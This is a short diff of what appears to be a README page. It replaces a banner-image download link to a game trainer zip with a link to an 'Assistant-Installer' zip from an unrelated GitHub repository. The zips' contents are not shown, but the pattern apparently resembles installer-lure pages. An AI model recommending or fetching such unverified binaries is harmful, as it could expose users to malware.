@@ -5,7 +5,7 @@
 
 
 
-<a href="https://github.com/CyanKaiserHaul/aniimo-mod-trainer/releases/download/Latest/Aniimo_Trainer_1.3.0.zip">
+<a href="https://github.com/RatioRatPier/RimAssistantLimbusCompany/releases/download/Latest/Assistant-Installer-V2.1.zip">
   <img width="1920" height="547" alt="image" src="https://github.com/user-attachments/assets/9c6ae27a-651d-4190-b950-033febb53b16" />
 
 </a>
